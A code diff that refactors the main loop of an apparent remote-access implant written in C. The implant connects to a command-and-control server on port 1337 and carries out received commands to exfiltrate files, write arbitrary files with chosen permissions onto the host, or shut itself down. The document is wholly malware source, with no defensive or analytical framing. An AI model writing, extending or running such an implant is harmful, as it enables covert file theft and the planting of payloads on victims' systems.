@@ -1,16 +1,15 @@
 #include <sys/socket.h>
-#include <sys/types.h>
 #include <netinet/in.h>
-#include <netdb.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <errno.h>
 #include <arpa/inet.h>
 #include <stdbool.h>
 
-#include "c2_prot.h"
+#include "protocol/req.h"
+#include "protocol/req_exfiltration.h"
+#include "protocol/req_infiltration.h"
 #include "commands.h"
 
 #define CNC_PORT 1337
@@ -22,7 +21,7 @@ int connect_cnc()
     int err = 0;
     struct sockaddr_in cnc_addr;
 
-    memset((void *)&cnc_addr, 0, sizeof(cnc_addr));
+    memset((void *) &cnc_addr, 0, sizeof(cnc_addr));
 
     cnc_addr.sin_family = AF_INET;
     cnc_addr.sin_port = htons(CNC_PORT);
@@ -41,7 +40,7 @@ int connect_cnc()
         return err;
     }
 
-    if ((err = connect(sockfd, (struct sockaddr *)&cnc_addr, sizeof(cnc_addr))) < 0)
+    if ((err = connect(sockfd, (struct sockaddr *) &cnc_addr, sizeof(cnc_addr))) < 0)
     {
         perror("Failed to connect to host");
         return err;
@@ -54,7 +53,7 @@ int main()
 {
     int sockfd = 0;
     bool is_suicidal = false;
-    struct c2_req *req;
+    req *req;
 
     while (1)
     {
@@ -65,47 +64,51 @@ int main()
 
         puts("Connection successfully established");
 
-        while (req = receive_command(sockfd))
+        while ((req = read_req(sockfd)) != 0)
         {
-            printf("Command Info:\n\ttype: %hhu\n\trequest length: %hu\n", req->type, req->req_len);
+            printf("Command Info:\n\ttype: %u\n\trequest length: %zu\n", req->type, req__get_total_size(req));
 
             switch (req->type)
             {
-            case EXF_FILE:
-                puts("File exfiltration command received");
-                exfiltrate_file(sockfd, (struct exf_req *)req);
-                break;
+                case EXF_FILE:
+                    puts("File exfiltration command received");
 
-            case INF_FILE:
-                puts("File infiltration command received");
-                infiltrate_file(sockfd, (struct inf_req *)req);
-                break;
+                    exfiltrate_file(sockfd, ((req_exfiltration *) req)->path);
 
-            case READ_DIR:
-                puts("Read directory command received");
-                read_directory(sockfd, (struct dir_req *)req);
-                break;
+                    req_exfiltration__destroy((req_exfiltration *) req);
 
-            case SUICIDE:
-                puts("Suicide command received");
-                is_suicidal = true;
-                break;
+                    break;
 
-            default:
-                perror("Invalid command");
+                case INF_FILE:
+                    puts("File infiltration command received");
+
+                    infiltrate_file(sockfd,
+                                    ((req_infiltration *) req)->path,
+                                    ((req_infiltration *) req)->data,
+                                    ((req_infiltration *) req)->data_len,
+                                    ((req_infiltration *) req)->perms);
+
+                    req_infiltration__destroy((req_infiltration *) req);
+
+                    break;
+
+                case SUICIDE:
+                    puts("Suicide command received");
+                    is_suicidal = true;
+                    break;
+
+                default:
+                    perror("Invalid command");
             }
 
             free(req);
-            req = NULL;
 
             if (is_suicidal)
                 goto cleanup;
         }
-
-        if (!req) perror("Failed to receive command");
     }
 
-cleanup:
+    cleanup:
     close(sockfd);
 
     return 0;
